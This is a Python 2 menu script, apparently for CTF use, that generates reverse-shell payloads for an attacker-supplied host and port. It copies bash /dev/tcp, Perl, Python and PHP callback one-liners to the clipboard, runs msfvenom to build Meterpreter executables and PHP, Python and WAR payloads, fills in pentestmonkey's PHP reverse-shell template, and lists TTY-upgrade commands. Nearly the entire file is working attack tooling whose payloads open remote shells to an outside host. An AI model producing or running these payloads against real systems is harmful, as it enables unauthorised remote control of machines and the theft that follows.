#!/usr/bin/env python
# -*- coding: utf-8 -*-
#title           :shellcode.py
#description     :Help generate shellcode for a ctf
#author          :
#date            :
#version         :0.1
#usage           :python shellcode lhost lport
#=======================================================================
 
# Import the modules needed to run the script.
import sys, os
import pyperclip
import fileinput
if len(sys.argv) != 3:
    print "Usage: %s <LHOST> <LPORT>" % (sys.argv[0])
    sys.exit(0) 

IP_ADDR = sys.argv[1]
PORT = sys.argv[2]
args = (IP_ADDR,PORT)
# Main definition - constants
menu_actions  = {}  

 
# =======================
#     MENUS FUNCTIONS
# =======================
 
# Main menu
def main_menu():
    os.system('clear')
    
    print "Working Directory is /root/ctf/shellcode,\n"
    print "What code are you looking for?"
    print "1. Reverse Shells"
    print "2. TTY Code"
    print "\n0. Quit"
    choice = raw_input(" >>  ")
    exec_menu(choice)
 
    return

# Execute menu
def exec_menu(choice):
    os.system('clear')
    ch = choice.lower()
    if ch == '':
        menu_actions['main_menu']()
    else:
        try:
            menu_actions[ch]()
        except KeyError:
            print "Invalid selection, please try again.\n"
            menu_actions['main_menu']()
    return

# Menu 1
def menu1():
    print "20. linux/x86/meterpreter/reverse_tcp"
    print "21. linux/x64/meterpreter/reverse_tcp" 
    print "22. windows/meterpreter/reverse_tcp"
    print "23. windows/x64/meterpreter/reverse_tcp" 
    print "24. php/meterpreter_reverse_tcp"
    print "25. python/meterpreter/reverse_tcp"
    print "26. Bash Oneliner"
    print "27. Perl Oneliner"
    print "28. Python Oneliner"
    print "29. PHP Oneliner"
    print "30. PHP Oneliner v2"
    print "31. Edit pentestmonkey's php file"
    print "32. java/jsp_shell_reverse_tcp WAR file"
    print "9. Back"
    print "0. Quit"
    choice = raw_input(" >>  ")
    exec_menu(choice)
    return
 
 
# Menu 2
def menu2():
    print "Which one do you want copied to clipboard\n"
    print "10. python -c 'import pty; pty.spawn(\"/bin/sh\")'"
    print "11. python -c 'import pty; pty.spawn(\"/bin/bash\")'"
    print "12. echo os.system('/bin/bash')"
    print "13. /bin/sh -i"
    print "14. perl: exec \"/bin/sh\";"
    print "9. Back"
    print "0. Quit" 
    choice = raw_input(" >>  ")
    exec_menu(choice)
    return
 
# Back to main menu
def back():
    menu_actions['main_menu']()
 
# Exit program
def exit():
    sys.exit()

# python tty
def python_tty():
    shellcode = 'python -c \'import pty; pty.spawn("/bin/sh")\''
    oneliner(shellcode)

def python_tty_v2():
    shellcode = 'python -c \'import pty; pty.spawn("/bin/bash")\''
    oneliner(shellcode)

#bash tty code	
def bash_tty():
    shellcode = 'echo os.system(\'/bin/bash\')'
    oneliner(shellcode)

#bin code	
def bin_tty():
    shellcode = '/bin/sh -i'
    oneliner(shellcode)

#perl code
def perl_tty():
    shellcode = 'perl: exec "/bin/sh";'
    oneliner(shellcode)

#Linux x86 Meterpreter Menu 20
def linux_x86_meterpreter_reverse_tcp():
    shellcode = "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f elf -o shell.elf" % args
    msfvenom(shellcode)

#Linux x64 Meterpreter Menu 21
def linux_x64_meterpreter_reverse_tcp():
    shellcode = "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f elf -o shell64.elf" % args
    msfvenom(shellcode)

#Windows x64 Meterpreter Menu 22
def windows_meterpreter_reverse_tcp():
    shellcode = "msfvenom -p windows/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f exe -o shell.exe" % args
    msfvenom(shellcode)

#Windows x64 Meterpreter Menu 23
def windows_x64_meterpreter_reverse_tcp():
    shellcode = "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f exe -o shell64.exe" % args
    msfvenom(shellcode)

#PHP Meterpreter Menu 24
def php_meterpreter_reverse_tcp():
    shellcode = "msfvenom -p php/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f raw -o shell.php" % args
    msfvenom(shellcode)

#Python Metepreter Menu 25
def python_meterpreter_reverse_tcp(): 
    shellcode = "msfvenom -p python/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f raw -o shell.py" % args
    msfvenom(shellcode)

#Bash Oneliner Menu 26
def bash_oneliner():
	shellcode = 'bash -i >& /dev/tcp/%s/%s 0>&1' % args
	oneliner(shellcode)

#Python Oneliner Menu 27
def perl_oneliner():
	shellcode = 'perl -e \'use Socket;$i="%s";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\'' % args
	oneliner(shellcode)

#Python Oneliner Menu 28
def python_oneliner():
	shellcode = 'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'' % args
	oneliner(shellcode)

#PHP Oneliner Menu 29
def php_oneliner():
	shellcode = 'php -r \'$sock=fsockopen("%s",%s);exec("/bin/sh -i <&3 >&3 2>&3");\'' % args
	oneliner(shellcode)

def php_oneliner_v2():
    shellcode = 'php -r \'$sock = fsockopen("%s",%s); $proc = proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes); \'' % args
    oneliner(shellcode)

#PHP java/jsp_shell_reverse_tcp WAR 31
def java_war():
    shellcode = "msfvenom -p java/jsp_shell_reverse_tcp LHOST=%s LPORT=%s -f war -o shell.war" % args
    oneliner(shellcode)

# Other resources
# http://bernardodamele.blogspot.com/2011/09/reverse-shells-one-liners.html

#MSFVENOM shortcode
def msfvenom(shellcode):
    warning ="Make sure you are using the correct payload in MSFConsole"
    os.system('clear')
    print "Writing Shell"
    print shellcode
    os.system(shellcode)
    print warning

#One liner shortcode
def oneliner(shellcode):
	print shellcode + " Copied to clipboard"
	pyperclip.copy(shellcode)
	sys.exit

#Edit PHP Monkey's File	Menu 30
def php_file_pentestmonkey():
        filename = "php-reverse-shell.php"
	fin = open("/root/ctf/shellcode/php-reverse-shell-template.php")
	fout = open(filename, "wt")
	for line in fin:
            if '127.0.0.1' in line :
                fout.write( line.replace('127.0.0.1', IP_ADDR) )
            elif '1234' in line:
                fout.write( line.replace('1234', PORT) )
            else:    
                fout.write(line)
	fin.close()
	fout.close()
        print "File created and updated as: " + filename

# =======================
#    MENUS DEFINITIONS
# =======================
 
# Menu definition
menu_actions = {
	'main_menu': main_menu,
    '1': menu1,
    '2': menu2,
    '10': python_tty,
    '11': python_tty_v2,
    '12': bash_tty,
    '13': bin_tty,
    '14': perl_tty,
    '20': linux_x86_meterpreter_reverse_tcp,
    '21': linux_x64_meterpreter_reverse_tcp,
    '22': windows_meterpreter_reverse_tcp,
    '23': windows_x64_meterpreter_reverse_tcp,
    '24': php_meterpreter_reverse_tcp,
    '25': python_meterpreter_reverse_tcp,
    '26': bash_oneliner,
    '27': perl_oneliner,
    '28': python_oneliner,
    '29': php_oneliner,
    '30': php_oneliner_v2,
    '31': php_file_pentestmonkey,
    '32': java_war,
    '9': back,
    '0': exit,
}

 
# =======================
#      MAIN PROGRAM
# =======================
 
# Main Program
if __name__ == "__main__":
    # Launch main menu
    main_menu()
